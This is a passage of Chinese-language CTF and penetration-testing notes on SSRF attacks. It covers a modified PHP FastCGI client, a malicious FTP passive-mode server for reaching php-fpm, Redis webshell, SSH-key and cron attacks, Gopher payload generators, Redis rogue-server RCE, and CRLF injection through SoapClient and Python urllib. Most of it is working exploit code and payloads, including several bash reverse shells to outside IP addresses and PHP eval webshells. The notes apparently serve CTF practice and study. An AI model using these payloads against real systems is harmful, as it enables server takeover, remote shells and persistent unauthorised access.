 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        echo('?file=ftp://ip:9999/&data='.urlencode($request));
//        fwrite($this->_sock, $request);
//        do {
//            $resp = $this->readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp && $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        }
    }
}
?>
<?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) {
//    die("Check your input\n");
//}
//if (!isset($_REQUEST['filepath'])) {
//    $filepath = __FILE__;
//}else{
//    $filepath = $_REQUEST['filepath'];
//}

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php payload -- Doesnt do anything
$php_value = "unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "; // extension_dir即为.so文件所在目录
$params = array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD'    => 'POST',
    'SCRIPT_FILENAME'   => $filepath,
    'SCRIPT_NAME'       => $req,
    'QUERY_STRING'      => 'command=whoami',
    'REQUEST_URI'       => $uri,
    'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
    'PHP_VALUE'         => $php_value,
    'SERVER_SOFTWARE'   => '80sec/wofeiwo',
    'REMOTE_ADDR'       => '127.0.0.1',
    'REMOTE_PORT'       => '9001', // 找准服务端口
    'SERVER_ADDR'       => '127.0.0.1',
    'SERVER_PORT'       => '80',
    'SERVER_NAME'       => 'localhost',
    'SERVER_PROTOCOL'   => 'HTTP/1.1',
    'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```

访问拿到payload

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198444-ac07672a-a36b-45b3-9152-535997a377d9.png#averageHue=%23efefef&id=WJlIY&originHeight=126&originWidth=2322&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

利用 ftp 与 php-fpm 对话 RCE

众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 gopher:// 协议结合使用（ssrf），该协议受 curl 支持，但不受 php 支持。

php支持的协议和封装协议 可代替发二进制包的协议只有ftp:// ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198534-5064e3e7-72dd-4046-8af8-c83464b1c43a.png#averageHue=%23dfcfc7&id=t6EPF&originHeight=346&originWidth=720&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 = 50069 端口。

选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址/端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。

我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 = 40 ，即可表达为：

```
227 Entering Passive Mode (192,168,150,90,195,149).
227 Entering Passive Mode (127,0,0,1,35,40).
```

file_put_contents() 用 ftp:// 与我们的恶意服务器建立控制连接，使目标发送 PASV 命令，我们“被动”提供 ip 端口至本地 9001端口，然后建立起数据连接，将 data （fastcgi payload）的内容打到FastCGI服务

在/var/www/html目录写文件file.php

```php
<?php
    $file = $_GET['file'] ?? '/tmp/file';
    $data = $_GET['data'] ?? ':)';
    echo($file."</br>".$data."</br>");
    var_dump(file_put_contents($file, $data));
    // echo file_get_contents($file);
```

准备利用前面生成的payload打

起恶意ftp服务

用如下脚本，在公网vps起

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2) 注意打到9001端口的服务
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

干就完事了，访问file.php用payload打

./file.php?file=ftp://vps:9999/&data=xxx

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198636-0773ca6a-8281-4a33-929f-294a8552a734.png#averageHue=%23e7e7e7&id=EYq2w&originHeight=958&originWidth=2136&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到dump出来int(681)，这里就是打的数据包大小

这时已经突破open_basedir，可以任意访问目录了，同时也执行了恶意.so文件

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198763-1f32762c-4221-4df3-a2ff-5883ed652bd8.png#averageHue=%23f0f0ef&id=YfZ7r&originHeight=1278&originWidth=2082&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 利用error_log打FPM

参考例题总结浙江省信息安全竞赛初赛baby_ssssrf

# redis攻击手法

参考

[https://www.anquanke.com/post/id/241146#h2-18](https://www.anquanke.com/post/id/241146#h2-18)

## 利用 Redis 写入 Webshell

```python
config set dir /var/www/html/ 
config set dbfilename shell.php
set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
save
```

最后写的样子如下

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364198942-a1c2398f-74bc-49d9-9aed-3bdf16075862.png#averageHue=%23232a32&id=AWl7B&originHeight=311&originWidth=625&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 利用 Redis 写入 SSH 公钥

首先在攻击机的/root/.ssh目录里生成ssh公钥key：

```shell
ssh-keygen -t rsa
```

接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：

```shell
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.43.82 -x set xxx

// -x 代表从标准输入读取数据作为该命令的最后一个参数。
```

然后，使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上

```powershell
redis-cli -h 192.168.43.82
config set dir /root/.ssh   测试发现这里没权限
config set dbfilename authorized_keys
save
```

最后，使用攻击机ssh连接目标受害机即可：

```
ssh 192.168.43.82
```

## 利用 Redis 写入计划任务

然后连接服务端的Redis，写入反弹shell的计划任务：

```powershell
redis-cli -h 192.168.142.153
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.43.247/2333 0>&1\n\n"
config set dir /var/spool/cron/crontabs/
config set dbfilename root
save
```

由于系统的不同，crontrab定时文件位置也会不同：

- Centos的定时任务文件在/var/spool/cron/
- Ubuntu定时任务文件在/var/spool/cron/crontabs/

## redis数据转Gopher

首先构造redis命令：（写shell）

```powershell
flushall
set 1 '\n\n<?php eval($_POST[\"whoami\"]);?>\n\n'
config set dir /var/www/html
config set dbfilename shell.php
save
```

然后写一个脚本，将其转化为Gopher协议的格式

```powershell
import urllib.parse
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n<?php eval($_POST[\"whoami\"]);?>\n\n"
filename="awd.php"
path="/tmp"
passwd=""    # 此处也可以填入Redis的密码, 在不存在Redis未授权的情况下适用
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(payload)
```

再二次编码发送即可

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199028-c9b5f31d-e2a3-46ad-acb1-6985bae7134f.png#averageHue=%23292929&id=hGGvy&originHeight=221&originWidth=1881&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
写ssh密钥也是一样道理，改就完事了

```powershell
flushall
set 1 '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali\n\n'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

写计划任务也是一样。改脚本即可

```powershell
flushall
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.43.247/2333 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

## 主从复制

### 无密码用rogue-server.py

```powershell
python3 redis-rogue-server.py --rhost 192.168.43.82 --lhost 192.168.43.247
```

比如我们选择 i 来获得一个交互式的shell，执行在里面执行系统命令即可：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199117-2ebe1505-01ea-4501-ae33-6048fab6048d.png#averageHue=%2303050a&id=Yhcbh&originHeight=425&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

也可以选择 r 来获得一个反弹shell：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199225-7bedf9a9-e688-4d87-972b-9dfced9b8469.png#averageHue=%2306090f&id=ppN7B&originHeight=295&originWidth=986&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 有密码用redis-rce

可以看到该工具有一个 -a 选项，可以用来进行Redis认证。

但是这个工具里少一个exp.so的文件，我们还需要去上面那个到 [redis-rogue-server](https://link.zhihu.com/?target=https%3A//github.com/n0b0dyCN/redis-rogue-server) 工具中找到exp.so文件并复制到redis-rce.py同一目录下，然后执行如下命令即可：

```powershell
python3 redis-rce.py -r 192.168.43.82 -L 192.168.43.247 -f exp.so -a 657260
```

后面是一样的了。i或者交互的，r是弹shell

### 例题参考

例题篇[网鼎杯 2020 玄武组]SSRFMe

# FTP被动模式打内网（PHP-FPM）

[https://www.anquanke.com/post/id/254387#h3-6](https://www.anquanke.com/post/id/254387#h3-6)

demo（靶机可以用ctfshow web811）

```python
<?php
file_put_contents($_GET['file'], $_GET['data']);
```

## 打fastcgi

使用 [Gopherus](https://github.com/tarunkant/Gopherus) 生成 Payload：

```python
python gopherus.py --exploit fastcgi
/var/www/html/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/VPS/2333 0>&1"  # 这里输入的是要执行的命令
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199332-d3505f53-1853-4260-9d7b-1a931fd68382.png#averageHue=%23070d11&id=mOCxh&originHeight=497&originWidth=1018&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

得到的 Payload 只要 _ 后面的部分：

```python
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/47.101.57.72/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

然后在 VPS 上运行以下脚本，搭建一个恶意的 FTP 服务器：

```python
# evil_ftp.py
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
python evil_ftp.py
```

开启 nc 监听，等待反弹shell：

```python
nc -lvvp 2333
```

最后构造请求发送 Payload 就行了：

```python
/?file=ftp://aaa@47.101.57.72:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/47.101.57.72/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199447-89120b6a-6025-4161-8890-0ed8b12dfc25.png#averageHue=%23beb56c&id=cc9ye&originHeight=1016&originWidth=1818&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

同样的方法可以打mysql、redis

## 打redis

用上面redis的姿势生成那个paylaod就行了

## 打mysql

```powershell
python gopherus.py --exploit mysql
root    # 这里输入MySQL的用户名
system bash -c "bash -i >& /dev/tcp/47.101.57.72/2333 0>&1";  # 这里输入的是需要执行的MySQL语句或命令, 这里我们反弹shell
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199589-35e3ecb0-86e0-48d0-8add-60d126ec45db.png#averageHue=%23090e12&id=cCvRf&originHeight=555&originWidth=1076&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 例题参考

例题篇里面的CVE-2021-3129：Laravel远程代码执行复现分析

例题篇[2021 羊城杯CTF]Cross The Side

# HTTP拆分攻击

## PHP fsockopen() 函数

demo

```python
<?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)
\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
/?url=47.101.57.72:4000%0d%0aSet-Cookie: PHPSESSID=whoami
```

响应包是下面这样的

```python
GET / HTTP/1.1
Host: 47.101.57.72:4000%0d%0aSet-Cookie: PHPSESSID=whoami
Connection: Close
```

也就是

```python
GET / HTTP/1.1
Host: 47.101.57.72:4000
Set-Cookie: PHPSESSID=whoami
Connection: Close
```

## PHP SoapClient 类

### 基础知识

```python
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

- 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。

知道上述两个参数的含义后，我们首先来发起一个正常的HTTP请求：

```python
<?php
$a = new SoapClient(null,array('location'=>'http://49.233.121.53:54/aaa', 'uri'=>'http://49.233.121.53:54'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

VPS 上监听到了 POST 请求：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199707-d65d29d1-f4da-4ed9-9dc0-6708c9021978.png#averageHue=%232d4e62&id=jOrkU&originHeight=431&originWidth=1100&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### CRLF注入

下面我们尝试 CRLF 注入，插入任意的 HTTP 头。

```python
<?php
$target = 'http://47.101.57.72:4000/';
$a = new SoapClient(null,array('location' => $target, 'user_agent' => "WHOAMI\r\nSet-Cookie: PHPSESSID=whoami", 'uri' => 'test'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199824-3acb9adc-0b8c-4dfc-9945-67a4c18ef182.png#averageHue=%232a4b5f&id=OmENM&originHeight=362&originWidth=2213&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 发送POST数据

在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。

对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。

```python
<?php
$target = 'http://49.233.121.53:54/';
$post_data = 'data=whoami';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$a = new SoapClient(null,array('location' => $target,'user_agent'=>'WHOAMI^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));
$b = serialize($a);
$b = str_replace('^^',"\n\r",$b);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364199957-b9be2bc0-601f-49bf-8192-cf37efb7348b.png#averageHue=%23254256&id=nQrIi&originHeight=589&originWidth=2232&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## Python urllib CRLF 注入漏洞（CVE-2019-9740）

Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。

### 在 HTTP 状态行注入恶意首部字段

demo

```python
#!python
#!/usr/bin/env python3
import urllib
import urllib.request
import urllib.error

# url = "http://47.101.57.72:4000
url = "http://47.101.57.72:4000?a=1 HTTP/1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID=whoami"
# ?a=1 后面的那个HTTP/1.1是为了闭合正常的HTTP状态行
try:
    info = urllib.request.urlopen(url).info()
    print(info)

except urllib.error.URLError as e:
    print(e)
```

执行代码后，VPS 上会监听到如下HTTP头：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364200116-4db2cdf9-634a-4898-bb19-80f4fc1a30a2.png#averageHue=%230c2335&id=N9OXc&originHeight=305&originWidth=1033&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，成功引发了CRLF漏洞。

### 在 HTTP 状态行注入完整 HTTP 请求

假设目标主机存在SSRF，需要我们在目标主机本地上传文件。下面尝试构造如下这个文件上传的完整 POST 请求：

```python
POST /upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 437
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
Connection: close

------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php eval($_POST["whoami"]);?>
------WebKitFormBoundaryjDb9HMGTixAA7Am6
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryjDb9HMGTixAA7Am6--
```

编写脚本构造payload：

```python
payload = ''' HTTP/1.1

POST /upload.php HTTP/1.1
